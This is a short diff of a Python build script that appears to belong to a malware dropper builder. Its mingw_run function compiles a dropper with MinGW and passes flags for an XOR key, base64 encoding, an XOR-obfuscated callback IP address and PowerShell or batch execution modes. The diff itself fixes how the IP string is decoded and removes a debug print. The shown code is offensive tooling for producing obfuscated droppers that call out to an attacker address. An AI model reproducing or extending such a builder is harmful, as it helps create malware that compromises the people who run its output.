@@ -1,3 +1,6 @@
+# add the wal and make the prints more condensed
+# for example: make the flags that were read from go on one line
+
 import ctypes
 import argparse
 import base64
@@ -152,7 +155,7 @@ def mingw_run(file_path: str, file_exe_path: str, dropper_write: str, configurat
 		f'-DDROPPER_OUTPUT="{dropper_write}"',
 		f"-DDROPPER_XOR_KEY={xor_key!s}",
 		f"-DDROPPER_BASE64={base64_integer!s}",
-		f'-DIPADDR="{ip_cstring.raw}"',
+		f'-DIPADDR="{ip_cstring.value.decode("utf-8")}"',
 		f"-DIPXOR={ip_xor}",
 		f"-DPOWERSHELL={dict_ext['powershell']}",
 		f"-DBATCH={dict_ext['batch']}",
@@ -175,7 +178,7 @@ def mingw_run(file_path: str, file_exe_path: str, dropper_write: str, configurat
 		f'-DDROPPER_OUTPUT="{dropper_write}"',
 		f"-DDROPPER_XOR_KEY={xor_key!s}",
 		f"-DDROPPER_BASE64={base64_integer!s}",
-	        f'-DIPADDR="{ip_cstring.raw}"',
+	        f'-DIPADDR="{ip_cstring.value.decode("utf-8")}"',
 		f"-DIPXOR={ip_xor}",
 		f"-DPOWERSHELL={dict_ext['powershell']}",
 		f"-DBATCH={dict_ext['batch']}",
@@ -189,7 +192,6 @@ def mingw_run(file_path: str, file_exe_path: str, dropper_write: str, configurat
 def convert_ip_to_cstring(ip: list[int]) -> ctypes.Array:
 	ip_buffer: ctypes.Array = ctypes.create_string_buffer(bytes(ip))
 	ip_buffer.value = bytes(ip)
-	print(f"This is the cstring of the ip: {ip_buffer.raw}")
 	return ip_buffer
 
 #compile the rc file so it can be added with g++
